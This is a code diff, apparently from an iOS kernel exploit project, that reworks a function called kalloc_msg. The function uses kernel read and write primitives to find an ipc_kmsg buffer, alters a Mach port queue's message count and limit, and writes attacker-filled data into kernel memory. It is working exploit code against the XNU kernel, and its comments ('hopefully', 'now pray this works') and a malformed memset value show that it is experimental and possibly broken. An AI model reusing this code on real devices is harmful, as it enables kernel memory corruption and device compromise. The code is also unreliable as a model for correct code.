@@ -83,7 +83,9 @@ void *kalloc_msg(UInt64 size) {
 		UInt64 head = kread64_ptr_kfd(circlequeue + 0x0); // circle_queue_head.head
 	NSLog(@"head: %p",head);
 	// sleep(2);
-		uint64_t message_buffer = kread64_ptr_kfd(head - 0x0); // first element of the circle queue __container_of which would be a pointer to an ipc_kmsg (hopefully) aka our kernel message buffer.
+		uint64_t kmsg = kread64_ptr_kfd(head - 0x0); // first element of the circle queue __container_of which would be a pointer to an ipc_kmsg (hopefully) aka our kernel message buffer.
+    uint64_t vector = kread64_ptr_kfd(kmsg + 1);
+    uint64_t message_buffer = kread64_ptr_kfd(vector + 0x0);
 		NSLog(@"message buffer: %llx\n", message_buffer);
 	// sleep(2);
 		// leak the message buffer:
@@ -91,10 +93,14 @@ void *kalloc_msg(UInt64 size) {
 	UInt64 imq_msgcountoff = mqueue + sizeof(mach_port_seqno_t) + sizeof(mach_port_name_t);
 	uint16_t imq_msgcount = kread16_kfd(imq_msgcountoff);
 	NSLog(@"imq_msgcount: %d",imq_msgcount);
-	kwrite16_kfd(imq_msgcountoff, imq_msgcount+size);
+	kwrite16_kfd(imq_msgcountoff, imq_msgcount+1);
 	UInt64 imq_qlimitoff = imq_msgcountoff + sizeof(uint16_t);
 	uint16_t imq_qlimit = kread16_kfd(imq_qlimitoff);
 	NSLog(@"imq_qlimit: %d",imq_qlimit);
-	kwrite16_kfd(imq_qlimitoff, imq_qlimit+size);
+	kwrite16_kfd(imq_qlimitoff,imq_qlimit+1);
+    void *data = malloc(size);
+    memset(data,0x41414141441,size);
+    kwritebuf_kfd(message_buffer, data, size); // make sure we actually allocated
+    free(data);
 	return message_buffer; // now pray this works.
 }
